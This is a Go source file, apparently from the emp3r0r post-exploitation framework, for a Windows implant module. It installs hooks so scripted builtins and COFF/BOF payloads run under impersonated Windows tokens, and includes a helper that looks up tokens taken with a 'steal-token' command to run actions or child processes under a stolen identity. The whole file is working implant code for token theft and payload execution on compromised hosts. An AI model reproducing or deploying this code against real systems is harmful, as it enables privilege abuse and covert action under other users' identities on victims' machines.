//go:build windows

package modules

import (
	"fmt"

	"github.com/jm33-m0/emp3r0r/core/lib/coffloader"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/priv"
	"github.com/jm33-m0/emp3r0r/core/lib/script"
	"golang.org/x/sys/windows"
)

func init() {
	// ---- starlark hooks ----
	// Each starlark builtin that does I/O calls runWithToken, which uses
	// these to LockOSThread + impersonate around the sensitive call.
	script.ImpersonateFn = func(token uintptr) error {
		return priv.ImpersonateThread(windows.Handle(token))
	}
	script.RevertFn = func() {
		priv.RevertThread()
	}
	script.ExecWithToken = func(token uintptr, commandLine string) error {
		return priv.CreateProcessWithToken(windows.Handle(token), commandLine)
	}

	// ---- coffloader hooks ----
	// COFF/BOF payloads are executed on a dedicated goroutine inside
	// coffloader. These hooks ensure that goroutine is impersonated before
	// the BOF entry point (syscall.SyscallN) is called.
	coffloader.PreExecHook = func(token uintptr) {
		if err := priv.ImpersonateThread(windows.Handle(token)); err != nil {
			logging.Warningf("COFF PreExecHook: ImpersonateThread failed: %v", err)
		}
	}
	coffloader.PostExecHook = func() {
		priv.RevertThread()
	}
}

// executeWithToken looks up the token identified by sid in priv.TokenMap
// and passes its handle (as uintptr) to action. If sid is empty, action
// receives 0 (no impersonation).
//
// Unlike earlier versions this does NOT call ExecuteAsToken. Each consumer
// is responsible for its own impersonation:
//   - starlark builtins use runWithToken (ImpersonateThread / RevertThread)
//     around individual syscalls.
//   - shell/python/… child processes ignore the thread token; use
//     CreateProcessWithTokenW when a child must run under the stolen identity.
func executeWithToken(sid string, action func(token uintptr) error) error {
	if sid == "" {
		return action(0)
	}

	raw, ok := priv.TokenMap.Load(sid)
	if !ok {
		return fmt.Errorf("token not found for SID %q – steal a token first with steal-token", sid)
	}

	hToken, ok := raw.(windows.Handle)
	if !ok {
		return fmt.Errorf("invalid token handle type for SID %q", sid)
	}

	return action(uintptr(hToken))
}
